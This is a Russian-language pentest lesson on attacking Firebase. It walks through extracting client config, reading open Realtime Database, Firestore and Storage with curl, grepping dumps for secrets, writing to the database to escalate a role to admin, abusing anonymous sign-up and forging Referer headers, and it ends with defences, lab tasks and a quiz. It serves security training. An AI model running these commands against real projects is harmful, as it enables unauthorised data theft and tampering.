---
id: cloud-gcp-firebase
title: "Firebase: security rules, открытые базы и кража данных"
category: cloud
parent: cloud-gcp-storage
difficulty: medium
order: 1
tags: [cloud, gcp, firebase, firestore, realtime-database, security-rules, storage]
prerequisites: [cloud-gcp-secrets-deep, cloud-gcp-storage]
useful_for:
  - "Пентест Firebase-приложений"
  - "Поиск открытых баз и Storage"
  - "Анализ security rules"
estimated_minutes: 45
summary: "Firebase: Realtime Database, Firestore, Storage и security rules. Как найти конфиг в клиенте, проверить rules и вытащить данные без аутентификации."
---

## Зачем этот урок

Firebase — клиентская грань GCP: мобильные и веб-приложения обращаются напрямую к базе/хранилищу, а безопасность обеспечивают **security rules**. Ошибки в правилах (`allow read, write: if true`) открывают данные всем. Конфиг Firebase (apiKey, databaseURL, projectId) по дизайну публичен и вшит в клиент, поэтому «достать конфиг» тривиально — важно, что разрешают правила. Firebase регулярно встречается в bug bounty и пентестах мобильных приложений.

## Модель Firebase

- **Realtime Database (RTDB)** — JSON-дерево с правилами в `rules` (JSON). Доступ по REST/WebSocket.
- **Cloud Firestore** — документная БД; правила на языке `rules_version = '2'`.
- **Cloud Storage for Firebase** — файлы; правила в `storage.rules`.
- **Authentication** — Firebase Auth (email/password, OAuth, anonymous). Anonymous-вход часто включён.
- **API key** — идентифицирует проект, не секрет. Ограничивается по referrer/app.

Ключевые публичные эндпоинты:
- RTDB: `https://<db>.firebaseio.com/.json`
- Firestore REST: `https://firestore.googleapis.com/v1/projects/<project>/databases/(default)/documents/<collection>`
- Auth: `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>`

## Инструменты и команды

```bash
# 1. Находим конфиг в клиенте
curl -s https://app.example.com/main.js | grep -oE 'apiKey["'"'"': ]+[A-Za-z0-9_-]+' | head
# apiKey: AIzaSyD...
curl -s https://app.example.com/main.js | grep -oE 'https://[a-z0-9-]+\.firebaseio\.com' | head
# https://myapp-default-rtdb.firebaseio.com

# 2. Пробуем прочитать RTDB без аутентификации
curl -s "https://myapp-default-rtdb.firebaseio.com/.json" | head -c 300
# {"users":{"1":{"email":"admin@example.com","role":"admin"}}, ...}

# 3. Firestore без аутентификации
curl -s "https://firestore.googleapis.com/v1/projects/myapp/databases/(default)/documents/users" | jq .
# {"documents":[{"name":".../users/1","fields":{"email":{"stringValue":"admin@example.com"}}}]}

# 4. Пробуем anonymous-вход
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyD..." \
  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}'
# {"idToken":"eyJ...","localId":"...","expiresIn":"3600"}
```

## Разобранный пример: открытая RTDB → полная база

Сценарий: приложение использует RTDB с правилами `.read: true`.

```bash
# Читаем корень базы
curl -s "https://myapp-default-rtdb.firebaseio.com/.json" -o db.json
python3 - <<'PY'
import json
d = json.load(open('db.json'))
def walk(o, p=''):
    if isinstance(o, dict):
        for k,v in o.items(): walk(v, f'{p}/{k}')
    else:
        if any(s in p.lower() for s in ('password','token','key','secret','apikey')):
            print(p, '=', o)
walk(d)
PY
# /users/1/apiKey = sk_live_51H...
# /config/smtpPassword = ...
# /private/adminToken = eyJhbGci...
```

Через минуту у нас есть токены, пароли и ключи. Если правила разрешают и запись (`.write: true`), можно менять данные: повысить себе роль, подменить конфиг, внедрить вредоносные ссылки. Проверьте оба направления.

## Firestore и Storage rules

Firestore:

```bash
# Чтение коллекции
curl -s "https://firestore.googleapis.com/v1/projects/myapp/databases/(default)/documents/orders" | jq '.documents[].fields'
```

Storage:

```bash
# Публичный доступ к файлам Firebase Storage
curl -s "https://firebasestorage.googleapis.com/v0/b/myapp.appspot.com/o?prefix=" | jq '.items[].name'
curl -s "https://firebasestorage.googleapis.com/v0/b/myapp.appspot.com/o/users%2F1%2Fphoto.jpg?alt=media" -o photo.jpg
```

Правила Firebase Storage, разрешающие `read: if true`, открывают все файлы. Если разрешён `write`, можно загрузить вредоносный файл (например, HTML для XSS на домене firebasestorage).

## Чек-лист атаки

1. Извлечь конфиг из JS/мобильного приложения.
2. Проверить RTDB: `/.json`, `/.settings/rules.json` (иногда доступен).
3. Проверить Firestore REST по коллекциям.
4. Проверить Storage listing и объекты.
5. Попробовать anonymous-вход и повторно проверить правила.
6. Проверить `apiKey` ограничения (referrer/app) — можно ли использовать с другого домена.
7. Проверить, есть ли `debug`/`staging` проекты с более слабыми правилами.

## Обход защит и edge cases

- **Auth required.** Если правила требуют аутентификации, попробуйте anonymous-вход; затем проверьте, нет ли IDOR в правилах (`request.auth.uid == resource.data.owner` можно обойти, если поле подконтрольно).
- **Custom claims.** Роль может храниться в custom claims; подделка требует ключа подписи или ошибки проверки.
- **App Check.** Может блокировать запросы из не-приложений; иногда отключён.
- **API key restrictions.** Ограничение по referrer обходится подделкой заголовка `Referer`/`Origin`.
- **Emulator.** Локальный эмулятор может иметь `debug`-правила, открытые; не путайте с прод.
- **App Hosting / Functions.** Cloud Functions для Firebase иногда имеют открытые HTTP-триггеры.

## Частые ошибки и подводные камни

- Считать apiKey секретом: он публичен, важны rules.
- Проверять только чтение, забыв про запись.
- Не проверить Storage: данные часто там, а не в базе.
- Игнорировать anonymous auth.
- Путать правила RTDB (JSON) и Firestore (rules v2).

## Защита и детект

- Писать строгие security rules: deny по умолчанию, проверка `request.auth`, валидация полей.
- Отключить anonymous auth, если не нужен; включить App Check.
- Ограничить apiKey по referrer/app.
- Не хранить секреты в базе; использовать серверные функции.
- Мониторить аномальный трафик к Firebase (в т.ч. через GCP audit logs).

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — `allow read, write: if true`. Второй — anonymous auth с широкими правами. Третий — секреты в базе. Четвёртый — открытый Storage. Пятый — debug-проект с теми же данными. Все они дают доступ к данным без аутентификации.

## Практическое задание

1. Создайте Firebase-проект с RTDB и правилом `.read: true`; прочитайте базу через curl.
2. Измените правило на `.read: auth != null` и проверьте, что анонимный доступ падает.
3. Включите anonymous auth и повторите.
4. Создайте Storage-правило с `read: true` и выгрузите файл.

## Что дальше / решение

Из Firebase достаём данные и токены. Дальше — использовать их (доступ к API, аккаунты). Зафиксируйте путь «конфиг → открытые rules → данные» в графе. Если правила строгие и auth обязателен — ищите IDOR в правилах или утечки токенов.

## Разобранный пример 2: запись в базу и эскалация

Если правила разрешают запись, атакующий может повысить себе роль или подменить данные.

```bash
# Пишем в RTDB
curl -s -X PUT "https://myapp-default-rtdb.firebaseio.com/users/1/role.json" \
  -H 'Content-Type: application/json' -d '"admin"'
# "admin"

# Проверяем
curl -s "https://myapp-default-rtdb.firebaseio.com/users/1/role.json"
# "admin"

# Или через Firestore REST
curl -s -X PATCH \
  "https://firestore.googleapis.com/v1/projects/myapp/databases/(default)/documents/users/1?updateMask.fieldPaths=role" \
  -H 'Content-Type: application/json' \
  -d '{"fields":{"role":{"stringValue":"admin"}}}'
```

После смены роли в базе приложение (или Firebase Auth custom claims, если роль синхронизируется) даст административный доступ. Даже без роли запись позволяет внедрить вредоносные данные: подменить ссылки, добавить товар, изменить баланс. Если правила проверяют только `auth != null`, любой анонимный пользователь может писать — проверьте это.

## Практическое задание

1. Создайте RTDB с правилом `.write: true` и запишите значение через curl.
2. Измените правило на `.write: auth != null` и повторите.
3. Включите anonymous auth и запишите значение от анонимного пользователя.
4. Включите App Check и проверьте, что запросы извне приложения блокируются.

## Firebase Auth и подделка токенов

Firebase Auth выдаёт ID-токены (JWT), подписанные ключами Google. Подделать их без приватного ключа нельзя, но есть обходные пути.

```bash
# Проверяем, включён ли anonymous auth
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$APIKEY" \
  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq '.idToken' | head -c 40

# Смотрим claims полученного токена
TOKEN=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$APIKEY" \
  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq -r .idToken)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Создание пользователя (если включена регистрация)
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$APIKEY" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","password":"Passw0rd!","returnSecureToken":true}'
```

Ключевой момент: правила могут проверять `request.auth.token.admin == true` или `request.auth.uid`. Если роль хранится в **custom claims**, а у вас есть возможность установить claims (через уязвимый серверный код или утечку ключа подписи), вы получите права. Также проверяйте, разрешена ли регистрация: иногда она открыта, и после создания пользователя правила дают больше доступа, чем анониму.

## Квиз

```quiz
- question: "Является ли Firebase apiKey секретом?"
  options:
    - "Нет, он публичен; безопасность обеспечивают security rules"
    - "Да, это пароль"
    - "Да, это приватный ключ"
    - "Нет, он не используется"
  answer: 0
  explanation: "apiKey идентифицирует проект, а не аутентифицирует пользователя."
- question: "Что означает правило 'allow read, write: if true'?"
  options:
    - "Любой может читать и писать без аутентификации"
    - "Только админ"
    - "Только чтение"
    - "Только запись"
  answer: 0
  explanation: "Правило открывает и чтение, и запись всем."
- question: "Где хранятся правила Realtime Database?"
  options:
    - "В JSON-узле rules проекта"
    - "В CloudTrail"
    - "В IAM"
    - "В KMS"
  answer: 0
  explanation: "Правила RTDB — это JSON (rules), применяемые к дереву."
- question: "Как обойти ограничение apiKey по referrer?"
  options:
    - "Подделать заголовок Referer/Origin"
    - "Ввести пароль"
    - "Запросить роль"
    - "Использовать SSH"
  answer: 0
  explanation: "Ограничение по referrer проверяет заголовок, который можно подменить."
```

## Где пригодится

- **Пентест мобильных/веб:** Firebase-базы.
- **Bug bounty:** Firebase в scope.
- **Red team:** получение данных без аутентификации.
- **App security:** аудит security rules.
